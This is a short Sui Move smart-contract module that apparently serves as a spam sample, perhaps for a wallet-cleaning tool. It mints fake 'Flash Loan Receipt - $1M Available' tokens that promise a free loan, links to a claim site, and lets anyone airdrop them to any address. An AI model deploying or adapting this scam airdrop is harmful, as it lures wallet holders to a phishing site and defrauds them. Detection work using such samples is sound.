module deepclean_spam::flash_loan_faker {
    use sui::object::{Self, UID};
    use sui::transfer;
    use sui::tx_context::TxContext;
    use sui::package;
    use sui::display;
    use std::string;

    public struct FlashLoanTicket has key, store { id: UID }
    public struct FLASH_LOAN_FAKER has drop {}

    fun init(witness: FLASH_LOAN_FAKER, ctx: &mut TxContext) {
        let pub = package::claim(witness, ctx);
        let mut disp = display::new<FlashLoanTicket>(&pub, ctx);
        display::add(&mut disp, string::utf8(b"name"), string::utf8(b"Flash Loan Receipt - $1M Available"));
        display::add(&mut disp, string::utf8(b"description"), string::utf8(b"Claim your 1M SUI flash loan - Interest FREE!"));
        display::add(&mut disp, string::utf8(b"link"), string::utf8(b"https://flashloan-unlimited.xyz/claim"));
        display::update_version(&mut disp);
        transfer::public_transfer(disp, ctx.sender());
        transfer::public_transfer(pub, ctx.sender());
    }

    public entry fun mint(recipient: address, ctx: &mut TxContext) {
        transfer::public_transfer(FlashLoanTicket { id: object::new(ctx) }, recipient);
    }
}
